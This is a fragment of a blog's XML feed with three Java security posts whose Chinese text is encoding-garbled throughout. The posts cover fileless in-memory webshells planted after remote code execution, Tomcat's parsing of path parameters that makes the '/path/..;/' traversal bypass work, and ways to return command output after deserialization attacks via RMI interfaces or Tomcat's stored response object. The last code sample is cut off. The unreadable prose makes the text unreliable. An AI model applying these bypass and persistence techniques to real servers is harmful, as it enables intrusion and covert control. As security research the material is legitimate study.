Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡å†™çš„å¾ˆåƒåœ¾ï¼Œå»ºè®®å­¦è¿‡åŸºæœ¬çš„ä¹‹åï¼Œå½“ç¬”è®°çœ‹å°±å¥½äº†ã€‚æœ¬æ–‡å†™äº†ç‚¹å¯èƒ½æ¯”è¾ƒæ–°å¥‡çš„ä¸œè¥¿ã€‚&lt;/p&gt;
&lt;p&gt;æƒ³è®¤çœŸå­¦çš„è¿˜æ˜¯å»çœ‹æ–‡æœ«çš„Refå§ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å‰æï¼šå’Œå›æ˜¾ç±»ä¼¼ã€‚å¾—å…ˆRCE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å¥½å¤„ï¼šè§„é¿é™æ€æ–‡ä»¶çš„æŸ¥æ€&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åŸç†ï¼š&lt;/strong&gt;Java Webä¸åƒapache + phpæ¨¡å¼ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½æ˜¯ç”Ÿæˆæ–°çš„phpå®ä¾‹ã€‚Java Webæ˜¯é•¿æœŸè¿è¡Œçš„ï¼ˆåŒç†çš„è¿˜æœ‰.netã€goã€pythonè¿™äº›ï¼‰ã€‚Webç¨‹åºå¿…å®šä¼šæœ‰ç›¸å…³çš„å˜é‡ã€é€»è¾‘è¿›è¡Œè¯·æ±‚åˆ†å‘çš„æ“ä½œã€‚å½“æˆ‘ä»¬RCEä¹‹åï¼Œè‹¥èƒ½æ§åˆ¶è¿›è¡Œè¯·æ±‚åˆ†å‘çš„å˜é‡ï¼Œä¾¿èƒ½æ§åˆ¶è¯·æ±‚åˆ†å‘çš„é€»è¾‘ã€‚&lt;/p&gt;
&lt;p&gt;å¸¸è§çš„æ“ä½œæœ‰ï¼šæ–°å¢æ§åˆ¶å™¨ã€ä¿®æ”¹æ§åˆ¶å™¨ã€æ·»åŠ æ‹¦æˆªå™¨ç­‰&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºpath variables ;çš„è§£æåŠç»å…¸..;/çš„æˆå› </title>
    <link href="http://example.com/2022/07/07/2022-07-07-java-path-variables/"/>
    <id>http://example.com/2022/07/07/2022-07-07-java-path-variables/</id>
    <published>2022-07-07T15:24:00.000Z</published>
    <updated>2022-07-07T16:17:00.512Z</updated>
    
    <content type="html"><![CDATA[<p>å…³äº path variables ; çš„è§£æåŠç»å…¸<code>..;/</code>çš„æˆå› </p><span id="more"></span><p><a href="https://datatracker.ietf.org/doc/html/rfc6570#section-3.2.1">RFCæ–‡æ¡£</a>ä¸­å…³äº path expansion çš„æè¿°ä¸­ï¼Œæœ‰ä¸‹é¢çš„æ¨¡æ¿ä¾‹å­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Type    Separator</span><br><span class="line">         &quot;,&quot;     (default)</span><br><span class="line">+        &quot;,&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">        <span class="string">&quot;,&quot;</span></span></span><br><span class="line">.        &quot;.&quot;</span><br><span class="line">/        &quot;/&quot;</span><br><span class="line">;        &quot;;&quot;</span><br><span class="line">?        &quot;&amp;&quot;</span><br><span class="line">&amp;        &quot;&amp;&quot;</span><br><span class="line"></span><br><span class="line">Example Template     Expansion</span><br><span class="line">&#123;count&#125;            one,two,three</span><br><span class="line">&#123;count*&#125;           one,two,three</span><br><span class="line">&#123;/count&#125;           /one,two,three</span><br><span class="line">&#123;/count*&#125;          /one/two/three</span><br><span class="line">&#123;;count&#125;           ;count=one,two,three</span><br><span class="line">&#123;;count*&#125;          ;count=one;count=two;count=three</span><br><span class="line">&#123;?count&#125;           ?count=one,two,three</span><br><span class="line">&#123;?count*&#125;          ?count=one&amp;count=two&amp;count=three</span><br><span class="line">&#123;&amp;count*&#125;          &amp;count=one&amp;count=two&amp;count=three</span><br></pre></td></tr></table></figure><p>è€Œ <code>/path;key=value</code> æ˜¯ä¸€ç§Path variablesçš„å½¢å¼ï¼Œç±»ä¼¼æœ€å¸¸è§çš„<code>?key=value</code>ã€‚Tomcatå¯¹å…¶çš„è§£æåœ¨<code>CoyoteAdapter#parsePathParameters()</code></p><p>å…³é”®ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">parsePathParameters</span><span class="params">(org.apache.coyote.Request req,</span></span></span><br><span class="line"><span class="function"><span class="params">                                   Request request)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    req.decodedURI().toBytes();</span><br><span class="line">    ByteChunk uriBC = req.decodedURI().getByteChunk();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//ä»URIä¸­æ‰¾åˆ°ç¬¬ä¸€ä¸ª;</span></span><br><span class="line">    <span class="keyword">int</span> semicolon = uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (semicolon == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è¯»å–å¤šä¸ª;key=value</span></span><br><span class="line">    <span class="keyword">while</span> (semicolon &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//ç¡®å®š;key=valueçš„å³è¾¹ç•Œ</span></span><br><span class="line">        <span class="keyword">int</span> start = uriBC.getStart();</span><br><span class="line">        <span class="keyword">int</span> end = uriBC.getEnd();</span><br><span class="line">        <span class="keyword">int</span> pathParamStart = semicolon + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//[!] ç¡®å®šå³è¾¹ç•Œæ—¶ï¼Œè¾¹ç•Œåˆ†éš”ç¬¦æ˜¯;æˆ–/</span></span><br><span class="line">        <span class="keyword">int</span> pathParamEnd = ByteChunk.findBytes(uriBC.getBuffer(),</span><br><span class="line">                                               start + pathParamStart, end,</span><br><span class="line">                                               <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123;<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        String pv = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (pathParamEnd &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">//ä»/path;key=value.... ä¸­æå–key=value</span></span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="keyword">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> String(uriBC.getBuffer(), start + pathParamStart,</span><br><span class="line">                                pathParamEnd - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//[+]å–/path;key=value... ä¸­...çš„éƒ¨åˆ†ï¼ŒæŠ¹é™¤æ‰åŸURIçš„;key=valueï¼Œå°†...æ‹¼æ¥åˆ°/pathåé¢</span></span><br><span class="line">            <span class="keyword">byte</span>[] buf = uriBC.getBuffer();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; end - start - pathParamEnd; i++) &#123;</span><br><span class="line">                buf[start + semicolon + i]</span><br><span class="line">                    = buf[start + i + pathParamEnd];</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setBytes(buf, start,</span><br><span class="line">                           end - start - pathParamEnd + semicolon);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æ²¡è¾¹ç•Œäº†ï¼Œç»“æŸæå–key=value</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (charset != <span class="keyword">null</span>) &#123;</span><br><span class="line">                pv = <span class="keyword">new</span> String(uriBC.getBuffer(), start + pathParamStart,</span><br><span class="line">                                (end - start) - pathParamStart, charset);</span><br><span class="line">            &#125;</span><br><span class="line">            uriBC.setEnd(start + semicolon);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è§£ækey=valueï¼Œåˆ†å¼€keyå’Œvalue</span></span><br><span class="line">        <span class="keyword">if</span> (pv != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> equals = pv.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (equals &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">                String name = pv.substring(<span class="number">0</span>, equals);</span><br><span class="line">                String value = pv.substring(equals + <span class="number">1</span>);</span><br><span class="line">                request.addPathParameter(name, value);</span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;coyoteAdapter.debug&quot;</span>, <span class="string">&quot;equals&quot;</span>,</span><br><span class="line">                                           String.valueOf(equals)));</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;coyoteAdapter.debug&quot;</span>, <span class="string">&quot;name&quot;</span>,</span><br><span class="line">                                           name));</span><br><span class="line">                    log.debug(sm.getString(<span class="string">&quot;coyoteAdapter.debug&quot;</span>, <span class="string">&quot;value&quot;</span>,</span><br><span class="line">                                           value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å¦‚æœæœ‰å¤šä¸ª;key=valueï¼Œç»§ç»­æ‰¾</span></span><br><span class="line">        semicolon = uriBC.indexOf(<span class="string">&#x27;;&#x27;</span>, semicolon);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å°¤ä¸ºå…³æ³¨å¸¦<code>[+]</code>æ³¨é‡Šçš„ä»£ç ï¼Œè¿™äº›ä»£ç æ˜¯<code>..;/</code>ä¼šè¢«tomcatè®¤ä¸ºæ˜¯<code>../</code>çš„å…³é”®ã€‚</p><p>é¦–å…ˆåˆ¤æ–­path variablesçš„å³è¾¹ç•Œæ˜¯<code>/</code>ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥æ„é€ å½¢å¦‚<code>/path;key=value/;key=value</code>çš„å½¢å¼</p><p>ä¸‹é¢å°†<code>;key=value</code>æŠ¹é™¤ï¼Œå°†åé¢çš„å­—ç¬¦ä¸²æ‹¼æ¥ä¸Šå»ã€‚ç±»ä¼¼ä¸‹é¢è¿™æ ·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URI</span><br><span class="line">/path;key=value/;key=value -&gt;</span><br><span class="line">/path/;key=value -&gt;</span><br><span class="line">/path/</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢ä¸¤ç§ç‰¹æ€§ï¼Œå¯ä»¥å‘ç°URIä¸­æœ‰â€è¢«æ›¿æ¢â€å’Œâ€æ‹¼æ¥â€çš„æ“ä½œã€‚è¿™ä¸¤ç§æ“ä½œç»„åˆèµ·æ¥å®¹æ˜“è¡ç”Ÿå‡ºâ€ç»•è¿‡â€œã€â€é¢„æœŸä¸ç¬¦â€œã€â€è§£æä¸ä¸€è‡´â€œçš„é—®é¢˜ã€‚æ‰€ä»¥å½“æˆ‘ä»¬ä¼ å…¥äº†è¿™æ ·çš„URI</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/..;/</span><br></pre></td></tr></table></figure><p>ç”±äº<code>;</code>å’Œ<code>/</code>ä¹‹é—´æ²¡ä¸œè¥¿ï¼Œåˆä¼šè¢«æŠ¹å»<code>;</code>ã€‚æœ€ç»ˆURIä¼šå˜æˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/path/../</span><br></pre></td></tr></table></figure><p>PSï¼šçœ‹ä»£ç çš„æ—¶å€™ï¼Œæ€è·¯ä¸€å®šä¸èƒ½è¢«ä»–åŸæœ¬çš„åŠŸèƒ½é™åˆ¶ä½äº†ï¼Œæ¢³ç†å¥½åŠŸèƒ½åä¸€å®šè¦è·³å‡ºæ¥çœ‹ï¼Œç»“åˆåŠŸèƒ½çš„åœºæ™¯ï¼ˆæ¯”å¦‚è¿™é‡Œpath variablesæ˜¯åœ¨URIä¸Šçš„ï¼‰å‘æ•£æ€è€ƒã€‚</p><h1 id="Rerference"><a href="#Rerference" class="headerlink" title="Rerference"></a>Rerference</h1><p><a href="https://www.youtube.com/watch?v=CIhHpkybYsY">https://www.youtube.com/watch?v=CIhHpkybYsY</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å…³äº path variables ; çš„è§£æåŠç»å…¸&lt;code&gt;..;/&lt;/code&gt;çš„æˆå› &lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/categories/java/Tomcat/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="Tomcat" scheme="http://example.com/tags/Tomcat/"/>
    
  </entry>
  
  <entry>
    <title>javaå›æ˜¾</title>
    <link href="http://example.com/2022/07/07/2022-07-07-java-echo/"/>
    <id>http://example.com/2022/07/07/2022-07-07-java-echo/</id>
    <published>2022-07-07T15:23:00.000Z</published>
    <updated>2022-07-07T16:16:36.610Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰€è°“å›æ˜¾ã€‚æ ¹æ®å„å¸ˆå‚…çš„æ–‡ç« æ‰€è¯´ã€‚ç°æœ‰çš„å¤§å¤šæ•°æ˜¯ç”¨defineClass æˆ– URLClassLoaderã€‚åŠ è½½æ¶æ„ç±»å¹¶æ‰§è¡Œã€‚æ¶æ„ç±»ä¸­è¿›è¡Œä¾‹å¦‚æŠ¥é”™ã€å†™æ•°æ®ã€å¼€RMIé€šä¿¡ã€ç­‰è¿™äº›æ“ä½œã€‚å°±å›æ˜¾äº†ã€‚</p><p>ä¸ï¼Œå…¶å®ï¼Œæ¶‰åŠåˆ°å†…å­˜é©¬åŠ è½½ï¼Œéƒ½è¦ç”¨è¿™ã€‚</p><p>ååºåˆ—åŒ–å›æ˜¾ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¾é æœ€ç»ˆçš„ä»£ç æ‰§è¡Œç‚¹ï¼Œæ‰§è¡Œåˆ°defineClassæˆ–URLClassLoaderã€‚ï¼ŒRCEå˜›ï¼Œå’±æƒ³æ€ä¹ˆæ“ä½œå°±æ€ä¹ˆæ“ä½œã€‚</p><span id="more"></span><h1 id="RMIæ–¹å¼å›æ˜¾"><a href="#RMIæ–¹å¼å›æ˜¾" class="headerlink" title="RMIæ–¹å¼å›æ˜¾"></a>RMIæ–¹å¼å›æ˜¾</h1><p>RMI Bind Echoæ—¶è¦æ³¨æ„ï¼šç±»å‹è½¬æ¢æ—¶ï¼Œåªèƒ½è½¬æ¢æˆæ¥å£ç±»å‹ã€‚ä¸èƒ½è½¬æ¢æˆç±»ç±»å‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//ä½¿ç”¨æ¥å£ç±»å‹æ¥æ¥ï¼Œå¯æˆ</span></span><br><span class="line">        com.interfa.D1 o1 = InitialContext.doLookup(<span class="string">&quot;rmi://127.0.0.1/objectServer1&quot;</span>);</span><br><span class="line">        System.out.println(o1);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//ä½¿ç”¨å®ç°ç±»æ¥æ¥ï¼Œä¼šæŠ¥é”™</span></span><br><span class="line">        com.interfa.impl.D1Server o2 = InitialContext.doLookup(<span class="string">&quot;rmi://127.0.0.1/objectServer1&quot;</span>);</span><br><span class="line">        System.out.println(o2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¼ ç»™<code>defineClass</code>æ¥è¿˜åŸç±»æ—¶ï¼Œä¸€æ¬¡åªèƒ½ä¼ ä¸€ä¸ªç±»ã€‚æ²¡æ³•å°†æœ¬åœ°è‡ªå®šä¹‰æ¥å£ä¼ ä¸Šå»ã€‚</p><p>è™½è¯´è¿™ä¸ªæŠ¥é”™æ˜¯å®¢æˆ·ç«¯çš„æŠ¥é”™ã€‚ç…§ç†è¯´æˆ‘ä»¬ä»¿å†™ä¸€ä¸‹å‘é€é€»è¾‘ï¼Œå°±å¯ä»¥è§„é¿è¿™äº›é—®é¢˜ï¼Ÿ</p><p>ä¸ã€‚ä¸å¯ä»¥ã€‚RMIæœåŠ¡ç«¯åœ¨è°ƒç”¨æ–¹æ³•æ—¶ï¼Œæ˜¯æ ¹æ®æ¥å£å®šä¹‰çš„æ–¹æ³•ï¼Œæ¥ç”ŸæˆMethodHashçš„ã€‚æ™®é€šçš„Remoteæ¥å£ä¸­æ²¡æœ‰å®šä¹‰æ–¹æ³•ï¼Œæ‰€ä»¥æœ€ç»ˆçš„MethodHashMapæ˜¯ç©ºçš„ã€‚æ²¡æ³•æˆåŠŸè°ƒç”¨æ–¹æ³•ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡ç«¯ä¸Šæ‰¾ä¸€ä¸ª<strong>ç»§æ‰¿äº†Remoteçš„æ¥å£</strong>ï¼Œå¹¶ä¸”è¯¥æ¥å£èƒ½æ¥å—å‚æ•°ï¼ˆå‘½ä»¤ä¼ å‚ï¼‰ï¼Œå­˜åœ¨è¿”å›å€¼ï¼ˆå‘½ä»¤å›æ˜¾ï¼‰ã€‚</p><p>åœ¨åŸç”ŸJDkä¸­ï¼Œæ‰¾åˆ°å¦‚ä¸‹æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">RMIConnection</span><br><span class="line">    æ–¹æ³•: invoke()</span><br><span class="line">    ä¼ å‚: String</span><br><span class="line">    è¿”å›å€¼: Object</span><br><span class="line"></span><br><span class="line">Activator    </span><br><span class="line">æ–¹æ³•: activate()</span><br><span class="line">    ä¼ å‚: ActivationID - ç¡¬ç”Ÿç”Ÿæ„é€ åº”è¯¥ä¹Ÿè¡Œã€‚ä½†æ˜¯å¤ªé•¿äº†å“ˆå“ˆå“ˆã€‚ä¸è€ƒè™‘</span><br><span class="line">    è¿”å›å€¼: MarshalledObject - <span class="keyword">byte</span>[] objByteså¯å­˜å‚¨æ•°æ®</span><br><span class="line">        </span><br><span class="line">RMIServer</span><br><span class="line">æ–¹æ³•: newClient()</span><br><span class="line">    ä¼ å‚: Object</span><br><span class="line">    è¿”å›å€¼: RMIConnection - RMIConnectionImplå®ç°ç±»ä¸­æœ‰å±æ€§String connectionId å¯å­˜å‚¨æ•°æ®</span><br><span class="line">    </span><br><span class="line">DGC</span><br><span class="line">æ–¹æ³•: dirty()</span><br><span class="line">    ä¼ å‚: Lease - VMIDå±æ€§é‡Œæœ‰<span class="keyword">byte</span>[] addrå¯å­˜å‚¨æ•°æ®</span><br><span class="line">    è¿”å›å€¼: Lease - VMIDå±æ€§é‡Œæœ‰<span class="keyword">byte</span>[] addrå¯å­˜å‚¨æ•°æ®</span><br><span class="line"></span><br><span class="line">ActivationSystem</span><br><span class="line">    æ–¹æ³•: setActivationDesc()</span><br><span class="line">    ä¼ å‚: ActivationDesc - String classNameå±æ€§å¯å­˜å‚¨æ•°æ®</span><br><span class="line">    è¿”å›å€¼: ActivationDesc - String classNameå±æ€§å¯å­˜å‚¨æ•°æ®</span><br><span class="line">        </span><br><span class="line">ActivationInstantiator</span><br><span class="line">    æ–¹æ³•: newInstance()</span><br><span class="line">    ä¼ å‚: ActivationDesc - String classNameå±æ€§å¯å­˜å‚¨æ•°æ®</span><br><span class="line">    è¿”å›å€¼: MarshalledObject&lt;? extends Remote&gt; - <span class="keyword">byte</span>[] objByteså±æ€§å¯å­˜å‚¨æ•°æ®</span><br></pre></td></tr></table></figure><p>è™½è¯´å¤§éƒ¨åˆ†æ¥å£çš„è¿”å›å€¼ä¸æ˜¯Stringã€‚ä¼ å…¥çš„å‚æ•°ä¹Ÿä¸æ˜¯Stringã€‚ä½†åªè¦å‚æ•°å¯¹è±¡ä¸­ï¼Œå­˜åœ¨Stringã€byte[]è¿™ä¸¤ç§ç±»å‹çš„å±æ€§ã€‚å°±å¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œçš„å›æ˜¾ã€‚</p><p>æˆ–è€…ï¼Œç›®æ ‡æ²¡æœ‰RMIã€‚æˆ‘ä»¬å¯ä»¥è‡ªåˆ›ä¸€ä¸ªRMI Serverã€‚åªéœ€è¦ä¿®æ”¹ä¸‹æ¶æ„ç±»ï¼Œæ”¹æˆ<code>LocateRegistry.createRegistry()</code>å°±å¥½äº†ã€‚è¿™é‡Œä¸èµ˜è¿°äº†ã€‚</p><p>ç”¨CC2çš„è¯ã€‚ä¸€ç›´åå°„Invokeï¼Œä¹Ÿæ˜¯å¯çš„ã€‚åªæ˜¯éº»çƒ¦ç‚¹ã€‚è¿™é‡Œå°±ä¸å†™å•¦å“ˆå“ˆå“ˆã€‚</p><h1 id="Tomcatå›æ˜¾"><a href="#Tomcatå›æ˜¾" class="headerlink" title="Tomcatå›æ˜¾"></a>Tomcatå›æ˜¾</h1><p>ä¸»è¦çš„æ–¹æ³•ï¼š</p><ol><li>æŠ¥é”™å›æ˜¾</li><li>æ‹¿responseå¯¹è±¡</li><li>Linuxä¸‹æ‹¿<code>/proc/self/fd/i</code>ã€‚æ§åˆ¶æ–‡ä»¶æè¿°ç¬¦ä½œå›æ˜¾</li></ol><p>SpringMVCä¸­ç”¨Tomcatå›æ˜¾ï¼Œæœ‰äº›å°é—®é¢˜ã€‚å› ä¸ºControlleré€»è¾‘ä¸­è®¾ç½®äº†responseåï¼ŒSpringMvcä¼šå†å¤„ç†ä¸€è¾¹</p><p>è§£å†³æ€è·¯ï¼šåœ¨Controllerä¸­å°±è°ƒç”¨<code>Response#finishResponse</code>ã€‚å¼ºåˆ¶è¿”å›ã€‚</p><p>ä½†ä¸ç®¡æ€ä¹ˆæ ·ã€‚åœ¨SpringMVCä¸­å¼ºè¡Œè®¾ç½®responseã€‚ä¼šç•™ä¸‹ä¸€ä¸ªæŠ¥é”™æ—¥å¿—ã€‚ä¸å¤ªä¼˜é›…å“ˆå“ˆå“ˆ</p><p>æ—¥å¿—ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: getWriter() has already been called for this response</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹ç¨‹åºé€»è¾‘ï¼Œåˆå§‹åŒ–é™æ€å˜é‡"><a href="#ä¿®æ”¹ç¨‹åºé€»è¾‘ï¼Œåˆå§‹åŒ–é™æ€å˜é‡" class="headerlink" title="ä¿®æ”¹ç¨‹åºé€»è¾‘ï¼Œåˆå§‹åŒ–é™æ€å˜é‡"></a>ä¿®æ”¹ç¨‹åºé€»è¾‘ï¼Œåˆå§‹åŒ–é™æ€å˜é‡</h2><p>èµ·ä¸€ä¸ªTomcatï¼Œåœ¨Controlleræ‰“æ–­ç‚¹ã€‚ç„¶å<strong>å›çœ‹</strong>è°ƒç”¨æ ˆã€‚</p><p>å¯»æ‰¾æ€è·¯ï¼šæ‰¾ä¸€ä¸ªå­˜æ”¾äº†<code>response</code>çš„Staticå˜é‡ï¼Œè¿™æ ·ç¨‹åºå…¨å±€éƒ½å¯ä»¥ä½¿ç”¨åˆ°ä»–ã€‚</p><p>å®šä½åˆ° <em>ApplicationFilterChain#internalDoFilter()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationFilterChain</span> <span class="keyword">implements</span> <span class="title">FilterChain</span>, <span class="title">CometFilterChain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­˜åœ¨é™æ€å˜é‡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletRequest&gt; lastServicedRequest;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;ServletResponse&gt; lastServicedResponse;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The int which is used to maintain the current position </span></span><br><span class="line"><span class="comment">     * in the filter chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The int which gives the current number of filters in the chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    .....</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">internalDoFilter</span><span class="params">(ServletRequest request, </span></span></span><br><span class="line"><span 